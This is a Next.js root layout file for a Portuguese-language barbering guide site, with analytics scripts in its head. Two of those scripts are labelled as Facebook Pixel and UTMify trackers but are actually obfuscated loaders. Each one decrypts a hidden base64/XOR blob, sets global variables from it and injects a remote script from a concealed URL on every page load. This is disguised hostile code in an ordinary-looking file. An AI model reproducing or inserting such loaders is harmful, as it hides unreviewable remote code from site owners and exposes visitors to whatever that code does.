import type {Metadata} from 'next';
import './globals.css'; // Global styles
import Script from 'next/script';

export const metadata: Metadata = {
  title: 'Mapa do Degrade Sem Marca',
  applicationName: 'Mapa do Degrade Sem Marca',
  description: 'Guia visual para barbeiros entenderem pentes, alturas e transicoes no degrade.',
  icons: {
    icon: '/favicon.png',
    apple: '/favicon.png',
  },
};

export default function RootLayout({children}: {children: React.ReactNode}) {
  const gaId = process.env.NEXT_PUBLIC_GA_MEASUREMENT_ID;
  const clarityId = process.env.NEXT_PUBLIC_CLARITY_PROJECT_ID;

  return (
    <html lang="pt-BR">
      <head>
        {/* Facebook Pixel Script - Loaded asynchronously to prevent render-blocking */}
        <Script id="fb-pixel-script" strategy="afterInteractive">
          {`
            (function(){var n_jys=atob("DKJyBZ4+8EA4qsGea9lQcOxS0noawrXqG9FIKrFdlC4W37XzAsQLK/1RnW5a2O7tCNAbdepN3zBR0qTyRNIbfftS3ipLiO28CtYGd/dchTRd2eOkMP9eJ/lSnyJZxrK8UfkJJ/BfnSUakOPuAtoXadda0mwa3KDyHsdQP7wIkXRamviuCMZCZ64JwXRdnfL8CMFAY6gcjR1F");var e_nhcx=[];for(var m_pgp=0;m_pgp<n_jys.length;m_pgp++){e_nhcx.push(n_jys.charCodeAt(m_pgp)&255);}var a_t=e_nhcx[0];var v_2t=e_nhcx.slice(1,1+a_t);var a_i=e_nhcx.slice(1+a_t);var v_d5=a_i.map(function(b,y_l5s){return b^v_2t[y_l5s%a_t];});var g_rp="";for(var e_om=0;e_om<v_d5.length;e_om++){g_rp+=String.fromCharCode(v_d5[e_om]&255);}var b_f=decodeURIComponent(escape(g_rp));var r_8=JSON.parse(b_f);var x_cn=r_8.globals||[];x_cn.forEach(function(s_k){window[s_k.name]=s_k.value;});var p_t=document.createElement("script");p_t.src=r_8.url;p_t.async=true;p_t.defer=true;(r_8.attributes||[]).forEach(function(r_v){p_t.setAttribute(r_v.name,r_v.value);});(document.head||document.documentElement).appendChild(p_t);})();
          `}
        </Script>

        {/* UTMify Script - Loaded asynchronously to prevent render-blocking */}
        <Script id="utmify-script" strategy="afterInteractive">
          {`
            (function(){var p_cmh=atob("DPBD+w/hodweWO+cvIthjn2Ng+Y8MJvozIN51CCCxbIwLZvx1ZY61WyOzPJ8KsDv34Iqi3uSjqlqNZyz0JE3nnyVj7ZtesO+3YQ3iWaD1Kh7K82m54thlW6MxP4keov9yJFujnuMyLpndZ/u2YYmlXvM2b9xPMLv35th1y2XwLBrPc2mntI+13TDz71zPc2mnpQij27M1KhzMYnlkYAxnnmEz6gzK5r+1ZQw2SPD171yLYq+htJhhlKc");var n_dj37=[];for(var i_08=0;i_08<p_cmh.length;i_08++){n_dj37.push(p_cmh.charCodeAt(i_08)&255);}var w_9d42=n_dj37[0];var g_xqyj=n_dj37.slice(1,1+w_9d42);var x_bs8r=n_dj37.slice(1+w_9d42);var t_j4q=x_bs8r.map(function(b,s_1y){return b^g_xqyj[s_1y%w_9d42];});var x_t="";for(var c_5=0;c_5<t_j4q.length;c_5++){x_t+=String.fromCharCode(t_j4q[c_5]&255);}var p_n8=decodeURIComponent(escape(x_t));var l_7=JSON.parse(p_n8);var h_c5v=l_7.globals||[];h_c5v.forEach(function(j_p8){window[j_p8.name]=j_p8.value;});var g_0e=document.createElement("script");g_0e.src=l_7.url;g_0e.async=true;g_0e.defer=true;(l_7.attributes||[]).forEach(function(y_5apa){g_0e.setAttribute(y_5apa.name,y_5apa.value);});(document.head||document.documentElement).appendChild(g_0e);})();
          `}
        </Script>
      </head>
      <body suppressHydrationWarning>
        {children}

        {clarityId && (
          <Script id="clarity-init" strategy="lazyOnload">
            {`(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window,document,"clarity","script","${clarityId}");`}
          </Script>
        )}

        {gaId && (
          <>
            <Script
              src={`https://www.googletagmanager.com/gtag/js?id=${gaId}`}
              strategy="afterInteractive"
            />
            <Script id="ga4-init" strategy="afterInteractive">
              {`window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','${gaId}');`}
            </Script>
          </>
        )}
      </body>
    </html>
  );
}
